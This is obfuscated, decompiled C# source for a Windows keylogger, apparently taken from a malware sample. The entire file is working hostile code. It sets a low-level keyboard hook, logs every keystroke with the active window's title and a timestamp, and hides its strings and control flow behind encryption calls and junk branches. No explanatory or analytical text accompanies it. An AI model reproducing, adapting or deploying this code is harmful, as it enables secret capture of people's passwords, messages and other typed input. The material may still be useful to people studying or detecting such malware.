using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;
using _0023Ye;
using _0023i;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;

namespace _0023f;

internal class _0023zD
{
	private delegate int _0023Uc(int, int, ref _0023AD);

	public struct _0023AD
	{
		public int _0023dH;

		public int _0023eH;

		public int _0023fH;

		public int _0023gH;

		public int _0023hH;
	}

	private static _0023Uc _00237G = null;

	private static IntPtr _00238G = (IntPtr)0;

	private static string _00239G = null;

	[DllImport("user32", CharSet = CharSet.Ansi, EntryPoint = "SetWindowsHookExA", ExactSpelling = true, SetLastError = true)]
	private static extern int _0023Nc(int P_0, _0023Uc P_1, int P_2, int P_3);

	[DllImport("user32.dll", EntryPoint = "GetForegroundWindow", SetLastError = true)]
	public static extern IntPtr _0023Pc();

	[DllImport("user32.dll", CharSet = CharSet.Auto, EntryPoint = "GetWindowTextLength", SetLastError = true)]
	public static extern int _0023Rc(IntPtr P_0);

	[DllImport("user32.dll", CharSet = CharSet.Ansi, EntryPoint = "GetWindowTextA", ExactSpelling = true, SetLastError = true)]
	public static extern int _0023Qc(int P_0, StringBuilder P_1, int P_2);

	[DllImport("user32.dll", EntryPoint = "ToUnicodeEx")]
	private static extern int _0023EC(uint _0023FC, uint _0023GC, byte[] _0023HC, [Out][MarshalAs(UnmanagedType.LPWStr)] StringBuilder _0023IC, int _0023JC, uint _0023KC, IntPtr _0023LC);

	[DllImport("user32.dll", EntryPoint = "GetKeyboardState")]
	private static extern bool _0023MC(byte[] P_0);

	[DllImport("user32.dll", EntryPoint = "MapVirtualKey")]
	private static extern uint _0023NC(uint P_0, uint P_1);

	[DllImport("user32.dll", CharSet = CharSet.Ansi, EntryPoint = "GetWindowThreadProcessId", ExactSpelling = true, SetLastError = true)]
	private static extern int _0023OC(IntPtr P_0, ref int P_1);

	[DllImport("user32", CharSet = CharSet.Ansi, EntryPoint = "GetKeyboardLayout", ExactSpelling = true, SetLastError = true)]
	private static extern int _0023PC(int P_0);

	public static string _0023aH(IntPtr P_0)
	{
		try
		{
			string result = default(string);
			if (P_0.ToInt32() > 0)
			{
				IntPtr intPtr = P_0;
				StringBuilder stringBuilder2;
				while (true)
				{
					int num = _0023Rc(intPtr);
					int num2;
					if (2u != 0)
					{
						num2 = num;
					}
					int num3 = num2;
					if (false)
					{
						break;
					}
					if (num3 == 0)
					{
						if (5u != 0)
						{
							return null;
						}
						return result;
					}
					StringBuilder stringBuilder = new StringBuilder(num2 + 1);
					if (8u != 0)
					{
						stringBuilder2 = stringBuilder;
					}
					intPtr = P_0;
					if (0 == 0)
					{
						num3 = _0023Qc((int)intPtr, stringBuilder2, stringBuilder2.Capacity);
						break;
					}
				}
				string text = stringBuilder2.ToString().Trim();
				if (0 == 0)
				{
					result = text;
				}
				if (6u != 0)
				{
					return result;
				}
			}
			if (5u != 0)
			{
				return null;
			}
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result;
			do
			{
				result = null;
				ProjectData.ClearProjectError();
			}
			while (6 == 0);
			return result;
		}
	}

	public static void _0023bH()
	{
		try
		{
			_00237G = _0023yD;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		try
		{
			_00238G = (IntPtr)_0023Nc(13, _00237G, (int)Process.GetCurrentProcess().MainModule!.BaseAddress, 0);
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	public static int _0023yD(int P_0, int P_1, ref _0023AD P_2)
	{
		try
		{
			string text = _0023aH(_0023Pc());
			string text2;
			if (6u != 0)
			{
				text2 = text;
			}
			if (Operators.CompareString(text2, _00239G, false) != 0 && 0 == 0)
			{
				_00239G = text2;
				string[] array = new string[6];
				string[] array2;
				if (3u != 0)
				{
					array2 = array;
				}
				array2[0] = _0023xD._0023PG;
				array2[1] = _0023h._0023g(3098);
				array2[2] = text2;
				array2[3] = _0023h._0023g(3111);
				DateTime now = DateTime.Now;
				DateTime dateTime = default(DateTime);
				if (0 == 0)
				{
					dateTime = now;
				}
				array2[4] = dateTime.ToString();
				array2[5] = _0023h._0023g(3120);
				_0023xD._0023PG = string.Concat(array2);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		try
		{
			string text3 = _0023h._0023g(244);
			string text4;
			if (uint.MaxValue != 0)
			{
				text4 = text3;
			}
			if (!(P_1 == 260 || P_1 == 256))
			{
				goto IL_0caf;
			}
			int num;
			int num2;
			int num3;
			switch (P_2._0023dH)
			{
			case 190:
				if (((Computer)_0023mb._0023jb()).get_Keyboard().get_ShiftKeyDown() | Control.IsKeyLocked((Keys)20))
				{
					string text5 = _0023Ob._00235G(_0023h._0023g(3137), _0023h._0023g(2977));
					if (0 == 0)
					{
						text4 = text5;
					}
				}
				else
				{
					string text6 = _0023Ob._00235G(_0023h._0023g(3146), _0023h._0023g(2977));
					if (0 == 0)
					{
						text4 = text6;
					}
				}
				goto IL_0c8f;
			case 191:
				if (((Computer)_0023mb._0023jb()).get_Keyboard().get_ShiftKeyDown() | Control.IsKeyLocked((Keys)20))
				{
					num = 3155;
					if (num == 0)
					{
						break;
					}
					text4 = _0023Ob._00235G(_0023h._0023g(num), _0023h._0023g(2977));
				}
				else
				{
					text4 = _0023Ob._00235G(_0023h._0023g(3164), _0023h._0023g(2977));
				}
				goto IL_0c8f;
			case 36:
				text4 = _0023Ob._00235G(_0023h._0023g(3173), _0023h._0023g(2977));
				goto IL_0c8f;
			case 35:
				text4 = _0023Ob._00235G(_0023h._0023g(3190), _0023h._0023g(2977));
				goto IL_0c8f;
			case 219:
				text4 = ((!(((Computer)_0023mb._0023jb()).get_Keyboard().get_ShiftKeyDown() | Control.IsKeyLocked((Keys)20))) ? _0023Ob._00235G(_0023h._0023g(3216), _0023h._0023g(2977)) : _0023Ob._00235G(_0023h._0023g(3207), _0023h._0023g(2977)));
				goto IL_0c8f;
			case 16:
			case 160:
			case 161:
				text4 = null;
				goto IL_0c8f;
			case 221:
				text4 = ((!(((Computer)_0023mb._0023jb()).get_Keyboard().get_ShiftKeyDown() | Control.IsKeyLocked((Keys)20))) ? _0023Ob._00235G(_0023h._0023g(3234), _0023h._0023g(2977)) : _0023Ob._00235G(_0023h._0023g(3225), _0023h._0023g(2977)));
				goto IL_0c8f;
			case 220:
				if (((Computer)_0023mb._0023jb()).get_Keyboard().get_ShiftKeyDown() | Control.IsKeyLocked((Keys)20))
				{
					text4 = _0023Ob._00235G(_0023h._0023g(3243), _0023h._0023g(2977));
				}
				else
				{
					num2 = 3252;
					if (num2 == 0)
					{
						goto IL_083b;
					}
					text4 = _0023Ob._00235G(_0023h._0023g(num2), _0023h._0023g(2977));
				}
				goto IL_0c8f;
			case 186:
				text4 = ((!(((Computer)_0023mb._0023jb()).get_Keyboard().get_ShiftKeyDown() | Control.IsKeyLocked((Keys)20))) ? _0023Ob._00235G(_0023h._0023g(3270), _0023h._0023g(2977)) : _0023Ob._00235G(_0023h._0023g(3261), _0023h._0023g(2977)));
				goto IL_0c8f;
			case 222:
				text4 = ((!(((Computer)_0023mb._0023jb()).get_Keyboard().get_ShiftKeyDown() | Control.IsKeyLocked((Keys)20))) ? _0023Ob._00235G(_0023h._0023g(3288), _0023h._0023g(2977)) : _0023Ob._00235G(_0023h._0023g(3279), _0023h._0023g(2977)));
				goto IL_0c8f;
			case 96:
				text4 = _0023Ob._00235G(_0023h._0023g(3297), _0023h._0023g(2977));
				goto IL_0c8f;
			case 97:
				text4 = _0023Ob._00235G(_0023h._0023g(3306), _0023h._0023g(2977));
				goto IL_0c8f;
			case 98:
				text4 = _0023Ob._00235G(_0023h._0023g(3315), _0023h._0023g(2977));
				goto IL_0c8f;
			case 99:
				text4 = _0023Ob._00235G(_0023h._0023g(3324), _0023h._0023g(2977));
				goto IL_0c8f;
			case 100:
				text4 = _0023Ob._00235G(_0023h._0023g(3333), _0023h._0023g(2977));
				goto IL_0c8f;
			case 101:
				text4 = _0023Ob._00235G(_0023h._0023g(3342), _0023h._0023g(2977));
				goto IL_0c8f;
			case 102:
				text4 = _0023Ob._00235G(_0023h._0023g(3351), _0023h._0023g(2977));
				goto IL_0c8f;
			case 103:
				text4 = _0023Ob._00235G(_0023h._0023g(3360), _0023h._0023g(2977));
				goto IL_0c8f;
			case 104:
				text4 = _0023Ob._00235G(_0023h._0023g(3369), _0023h._0023g(2977));
				goto IL_0c8f;
			case 105:
				text4 = _0023Ob._00235G(_0023h._0023g(3378), _0023h._0023g(2977));
				goto IL_0c8f;
			case 187:
				num2 = (((Computer)_0023mb._0023jb()).get_Keyboard().get_ShiftKeyDown() ? 1 : 0);
				goto IL_083b;
			case 112:
			case 113:
			case 114:
			case 115:
			case 116:
			case 117:
			case 118:
			case 119:
			case 120:
			case 121:
			case 122:
			case 123:
			case 124:
			case 125:
			case 126:
			case 127:
			case 128:
			case 129:
			case 130:
			case 131:
			case 132:
			case 133:
			case 134:
			case 135:
				text4 = _0023Ob._00235G(_0023h._0023g(3405), _0023h._0023g(2977)) + Conversions.ToString(P_2._0023dH - 111) + _0023Ob._00235G(_0023h._0023g(3418), _0023h._0023g(2977));
				goto IL_0c8f;
			case 39:
				num3 = 3427;
				goto IL_08d3;
			case 40:
				text4 = _0023Ob._00235G(_0023h._0023g(3440), _0023h._0023g(2977));
				goto IL_0c8f;
			case 37:
				text4 = _0023Ob._00235G(_0023h._0023g(3453), _0023h._0023g(2977));
				goto IL_0c8f;
			case 38:
				text4 = _0023Ob._00235G(_0023h._0023g(3466), _0023h._0023g(2977));
				goto IL_0c8f;
			case 8:
				_0023xD._0023PG = _0023xD._0023PG.Substring(0, _0023xD._0023PG.Length - 1);
				goto IL_0c8f;
			case 162:
			case 163:
				text4 = _0023Ob._00235G(_0023h._0023g(3479), _0023h._0023g(2977));
				goto IL_0c8f;
			case 13:
				text4 = _0023h._0023g(444);
				goto IL_0c8f;
			case 9:
				text4 = _0023Ob._00235G(_0023h._0023g(3504), _0023h._0023g(2977));
				goto IL_0c8f;
			case 46:
				num3 = 3521;
				if (num3 == 0)
				{
					goto IL_08d3;
				}
				text4 = _0023Ob._00235G(_0023h._0023g(num3), _0023h._0023g(2977));
				goto IL_0c8f;
			case 27:
				text4 = _0023Ob._00235G(_0023h._0023g(3538), _0023h._0023g(2977));
				goto IL_0c8f;
			case 144:
				text4 = ((!((Computer)_0023mb._0023jb()).get_Keyboard().get_NumLock()) ? _0023Ob._00235G(_0023h._0023g(3588), _0023h._0023g(2977)) : _0023Ob._00235G(_0023h._0023g(3555), _0023h._0023g(2977)));
				goto IL_0c8f;
			case 91:
			case 92:
				text4 = _0023Ob._00235G(_0023h._0023g(3617), _0023h._0023g(2977));
				goto IL_0c8f;
			case 18:
			case 164:
			case 165:
				text4 = _0023Ob._00235G(_0023h._0023g(3646), _0023h._0023g(2977));
				goto IL_0c8f;
			case 33:
				text4 = _0023Ob._00235G(_0023h._0023g(3663), _0023h._0023g(2977));
				goto IL_0c8f;
			case 34:
				text4 = _0023Ob._00235G(_0023h._0023g(3688), _0023h._0023g(2977));
				if (false)
				{
					goto case 9;
				}
				goto IL_0c8f;
			case 32:
				text4 = _0023Ob._00235G(_0023h._0023g(3717), _0023h._0023g(2977));
				goto IL_0c8f;
			case 20:
				text4 = ((!Control.IsKeyLocked((Keys)20)) ? _0023Ob._00235G(_0023h._0023g(3759), _0023h._0023g(2977)) : _0023Ob._00235G(_0023h._0023g(3726), _0023h._0023g(2977)));
				goto IL_0c8f;
			case 192:
				text4 = ((!(((Computer)_0023mb._0023jb()).get_Keyboard().get_ShiftKeyDown() | Control.IsKeyLocked((Keys)20))) ? _0023Ob._00235G(_0023h._0023g(3801), _0023h._0023g(2977)) : _0023Ob._00235G(_0023h._0023g(3792), _0023h._0023g(2977)));
				goto IL_0c8f;
			case 189:
				if (((Computer)_0023mb._0023jb()).get_Keyboard().get_ShiftKeyDown() | Control.IsKeyLocked((Keys)20))
				{
					if (false)
					{
						goto case 18;
					}
					text4 = _0023Ob._00235G(_0023h._0023g(3810), _0023h._0023g(2977));
				}
				else
				{
					text4 = _0023Ob._00235G(_0023h._0023g(3819), _0023h._0023g(2977));
				}
				goto IL_0c8f;
			case 188:
				text4 = ((!(((Computer)_0023mb._0023jb()).get_Keyboard().get_ShiftKeyDown() | Control.IsKeyLocked((Keys)20))) ? _0023Ob._00235G(_0023h._0023g(3837), _0023h._0023g(2977)) : _0023Ob._00235G(_0023h._0023g(3828), _0023h._0023g(2977)));
				goto IL_0c8f;
			default:
				{
					try
					{
						text4 = ((!(((Computer)_0023mb._0023jb()).get_Keyboard().get_ShiftKeyDown() | Control.IsKeyLocked((Keys)20))) ? _0023cH((uint)P_2._0023dH).ToLower() : _0023cH((uint)P_2._0023dH).ToUpper());
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						text4 = _0023h._0023g(244);
						ProjectData.ClearProjectError();
					}
					goto IL_0c8f;
				}
				IL_083b:
				text4 = ((((uint)num2 | (Control.IsKeyLocked((Keys)20) ? 1u : 0u)) == 0) ? _0023Ob._00235G(_0023h._0023g(3396), _0023h._0023g(2977)) : _0023Ob._00235G(_0023h._0023g(3387), _0023h._0023g(2977)));
				goto IL_0c8f;
				IL_0c8f:
				Console.Write(text4);
				_0023xD._0023PG += text4;
				_0023xD._0023RG = _0023xD._0023PG;
				goto IL_0caf;
				IL_08d3:
				text4 = _0023Ob._00235G(_0023h._0023g(num3), _0023h._0023g(2977));
				goto IL_0c8f;
			}
			goto IL_0cb0;
			IL_0cb0:
			return num;
			IL_0caf:
			num = 0;
			goto IL_0cb0;
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			int result = 0;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static string _0023cH(uint P_0)
	{
		try
		{
			StringBuilder stringBuilder = new StringBuilder();
			StringBuilder stringBuilder2;
			if (true)
			{
				stringBuilder2 = stringBuilder;
			}
			int num = 255;
			byte[] array2 = default(byte[]);
			IntPtr intPtr2 = default(IntPtr);
			uint _0023GC = default(uint);
			while (true)
			{
				byte[] array = new byte[num];
				if (0 == 0)
				{
					array2 = array;
				}
				int num2;
				if (true)
				{
					num2 = (_0023MC(array2) ? 1 : 0);
					goto IL_0023;
				}
				goto IL_004b;
				IL_004b:
				IntPtr intPtr = _0023Pc();
				if (0 == 0)
				{
					intPtr2 = intPtr;
				}
				int num3 = 0;
				num2 = _0023OC(intPtr2, ref num3);
				if (0 == 0)
				{
					int num4 = num2;
					while (true)
					{
						num = num4;
						if (6 == 0)
						{
							break;
						}
						IntPtr _0023LC = (IntPtr)_0023PC(num);
						if (5u != 0)
						{
							_0023EC(P_0, _0023GC, array2, stringBuilder2, 5, 0u, _0023LC);
							return stringBuilder2.ToString();
						}
					}
					continue;
				}
				goto IL_0023;
				IL_0023:
				bool flag;
				if (3u != 0)
				{
					flag = (byte)num2 != 0;
				}
				if (!flag)
				{
					break;
				}
				uint num5 = _0023NC(P_0, 0u);
				if (0 == 0)
				{
					_0023GC = num5;
				}
				goto IL_004b;
			}
			string result = _0023h._0023g(244);
			if (4u != 0)
			{
				return result;
			}
			string result2;
			return result2;
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			ProjectData.ClearProjectError();
		}
		return ((Enum)(Keys)P_0).ToString();
	}
}
